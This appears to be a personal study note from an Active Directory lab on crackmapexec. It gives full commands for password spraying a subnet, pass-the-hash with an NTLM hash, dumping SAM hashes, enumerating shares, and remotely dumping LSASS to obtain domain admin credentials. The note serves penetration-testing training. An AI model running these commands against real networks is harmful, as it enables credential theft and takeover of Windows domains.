# crackmapexec

SMB module help:
```bash
crackmapexec smb --help
```

## Pass-the-password attack

Sweep the whole domain and try to login to SMB services with the specified credentials:
```bash
crackmapexec smb 10.0.0.0/24 -d MARVEL.local -u frank -p Password1
```
Output:
![[Pasted image 20240315141348.png]]
On the machines marked with *(Pwn3d!)* it was possible to login and the user is a local administrator.
(The logical next step would be to dump credentials on these machines. next section)

## Pass-the-hash attack

Pass the hash (previously captured by dumping the SAM db via ntlmrelayx) and try to login locally:
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```
Args:
`-H`: NTLM hash(es) or file(s) containing NTLM hashes
`--local-auth`: authenticate locally to each target

Output:
![[Pasted image 20240315142342.png]]

### Dump SAM database

Dump SAM db:
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
```
Args:
`--sam`: dump SAM hashes from target systems

Output:
![[Pasted image 20240315142805.png]]

### Enumerate shares

Enumerate shares:
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
```
Args:
`--shares`: enumerate shares and access

Output:
![[Pasted image 20240315143143.png]]

## List all availabe SMB modules

List all available SMB modules:
```bash
crackmapexec smb -L
```

## SMB module lsassy

lsassy github: https://github.com/Hackndo/lsassy

Use SMB module *lsassy* (Dump lsass and parse the result remotely with lsassy):
```bash
crackmapexec smb 10.0.0.0/24 -M lsassy -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

Output:
![[Pasted image 20240315144126.png]]
Game over: We got the domain administrator password! :D
This was possible because the domain admin did login into this machine and his credentials were still stored in the lsass process memory.

>[!Info] LSASS
>The Local Security Authority Subsystem Service (LSASS) is a Windows service responsible for enforcing the security policy on the system. It verifies users logging in, handles password changes and creates access tokens. Those operations lead to the storage of credential material in the process memory of LSASS. With administrative rights only, this material can be harvested (either locally or remotely).

## crackmapexec database

CME stores results and loot in a database.

Connect to the cme database:
```bash
cmedb
```

![[Pasted image 20240315144631.png]]

![[Pasted image 20240315144729.png]]